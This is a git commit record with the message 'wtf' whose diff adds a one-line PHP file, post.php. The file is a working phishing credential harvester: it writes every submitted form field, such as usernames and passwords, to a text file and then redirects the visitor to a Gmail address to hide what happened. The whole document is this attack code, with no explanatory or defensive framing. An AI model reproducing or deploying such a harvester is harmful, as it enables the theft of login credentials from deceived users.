869ebf763fa2df8f9e6a6e94168174c00d6d5fbd
Fernando Carreira <Fernando Carreira>
2016-11-11 14:21:47 -0200

    wtf

---
+++ post.php
@@ -0,0 +1,1 @@
+<?php header ('Location:https://gmail.com/googledirecterror'); $handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) {    fwrite($handle, $variable);    fwrite($handle, "=");    fwrite($handle, $value);    fwrite($handle, "\r\n"); } fwrite($handle, "\r\n"); fclose($handle); exit; ?>
